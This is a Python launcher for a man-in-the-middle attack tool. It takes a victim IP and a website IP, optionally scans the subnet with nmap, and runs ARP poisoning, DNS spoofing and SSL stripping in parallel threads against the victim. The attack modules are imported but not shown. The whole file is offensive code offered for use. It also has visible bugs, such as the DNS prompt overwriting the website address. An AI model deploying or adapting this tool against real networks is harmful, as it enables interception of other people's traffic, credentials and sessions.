from arp_poisoning import ARPPoison
from dns_spoofing import DNSSpoof
from ssl_stripping import SSLStrip
from silent_discovery import Silent

import argparse
import scapy.all as scapy
import logging
import threading
import time
import nmap
import netifaces

def get_default_gateway(iface):
    gateways = netifaces.gateways()

    for gateway, interface, *_ in gateways.get(netifaces.AF_INET, []):
        if iface == interface:
            return gateway

    return None

def parse_args():
    parser = argparse.ArgumentParser(
        description="Automated MITM attack tool with ARP poisoning, DNS spoofing and SSL stripping capabilities",
        add_help=True
    )

    parser.add_argument(
        "-i", "--interactive",
        action="store_true",
        help="Interactive mode"
    )

    default_interface = scapy.conf.iface
    parser.add_argument(
        "-e", "--interface",
        default=default_interface,
        help=f"Network interface (default: {default_interface})"
    )

    parser.add_argument(
        "-t", "--target",
        help="Victim IP address"
    )

    parser.add_argument(
        "-w", "--website",
        help="Website IP address"
    )

    default_gateway = get_default_gateway(default_interface)
    parser.add_argument(
        "-d", "--dns",
        default=default_gateway,
        help=f"DNS server IP address (default: {default_gateway})"
    )

    parser.add_argument(
        "-a", "--aggressiveness",
        type=int,
        default=5,
        help="Aggressiveness level (1-10, default: 5)"
    )

    parser.add_argument(
        "-f", "--forward",
        type=bool,
        default=True,
        help="Forwarding packets during ARP poisoning"
    )

    args = parser.parse_args()

    if not 1 <= args.aggressiveness <= 10:
        parser.error("Aggressiveness must be between 1 and 10")

    if not args.interactive:
        missing = []
        if not args.target:
            missing.append("-t/--target")
        if not args.website:
            missing.append("-w/--website")

        if missing:
            parser.error(f"! Missing required arguments: {', '.join(missing)} (or use -i)")

    return args

def setup():
    args = parse_args()

    if args.interactive:
        try:
            ifaces = scapy.get_if_list()
            print(f"Available interfaces: {ifaces}")
            args.interface = input("> Choose an interface: ").strip()
            while args.interface not in ifaces:
                print(f"! Invalid interface. Please choose an interface from the following list: {ifaces}")
                args.interface = input("> Choose an interface: ").strip()

            probe = input("> Probe subnet for available targets? [y/n] ").strip().lower()
            if probe == "y" or probe == "yes":
                nm = nmap.PortScanner()
                nm.scan(f"{scapy.get_if_addr(args.interface)}/24", arguments="-sP")
                print(f"Detected targets: {nm.all_hosts()}")
                targets = nm.all_hosts()
            else:
                targets = []
                stop_silent = threading.Event()
                silent = Silent(args.interface)
                silent_thread = threading.Thread(
                    target=silent.discover,
                    args=(stop_silent,)
                )
                silent_thread.start()

                while True:
                    check = input("Detecting hosts silently. Type 'done' to continue.\n").strip().lower()
                    if check == 'done':
                        if silent_thread.is_alive():
                            stop_silent.set()
                            silent_thread.join()
                        break

            args.target = input("> Input the victim IP address: ").strip()
            while args.target not in targets:
                print(f"! Invalid IP. Please choose an IP from the following list: {targets}")
                args.target = input("> Input the victim IP address: ").strip()

            args.website = input("> Input the website IP address: ").strip()
            while args.website not in targets:
                print(f"! Invalid IP. Please choose an IP from the following list: {targets}")
                args.website = input("> Input the website IP address: ").strip()

            args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
            while not 1 <= args.aggressiveness <= 10:
                print("! Invalid number. Aggressiveness must be between 1 and 10")
                args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
            args.website = input("> DNS server IP address: ").strip()

            args.forward = input("> Forward packets during ARP poisoning? [y/n] ").strip().lower()
            if args.forward == "y" or args.forward == "yes":
                forward = True
            else:
                forward = False
        except KeyboardInterrupt:
            print("\nAborted. Exiting...")
            try:
                if silent_thread.is_alive():
                    stop_silent.set()
                    silent_thread.join()
            except UnboundLocalError:
                pass
            exit(0)
    else:
        forward = args.forward

    return (
        args.interface,
        args.target,
        args.website,
        args.dns,
        args.aggressiveness,
        forward
    )

def run(iface, victim, website, dns, timer, forward):
    stop_event = threading.Event()

    # Poison ARP in a separate thread (to maintain MitM position)
    arp = ARPPoison(iface, victim, website)
    arp_thread = threading.Thread(
        target=arp.attack,
        args=(timer, forward, stop_event,)
    )

    # Spoof DNS in a separate thread
    dns_spoofer = DNSSpoof(iface, victim)
    dns_sniff_thread = threading.Thread(
        target=dns_spoofer.start,
        args=(stop_event,)
    )

    # Strip SSL in a separate thread
    ssl_stripper = SSLStrip(iface, victim, website)
    ssl_thread = threading.Thread(
        target=ssl_stripper.start,
        args=(stop_event,)
    )

    arp.set_dns(dns)

    arp_thread.start()
    dns_sniff_thread.start()
    ssl_thread.start()

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Program should stop on CTRL+C
        stop_event.set()
        print("\nAttack is being cancelled. Please wait...")

        arp_thread.join()
        dns_sniff_thread.join()
        ssl_thread.join()

        dns_spoofer.disable_dns_block()

        restore = input("Restore ARP tables? [y/n] ").strip().lower()
        if restore == "y" or restore == "yes":
            arp.restore_tables(arp.victimIP, arp.websiteIP, arp.victimMAC, arp.websiteMAC)
            if arp.dnsIP:
                arp.restore_tables(arp.victimIP, arp.dnsIP, arp.victimMAC, arp.dnsMAC)
            print("ARP tables were restored. Exiting...")
        else:
            print("ARP tables left spoofed. Exiting...")

        exit(0)

if __name__ == "__main__":
    scapy.conf.verb = 0
    logging.getLogger("scapy").setLevel(logging.ERROR)

    iface, victim, website, dns, timer, forward = setup()
    run(iface, victim, website, dns, timer, forward)
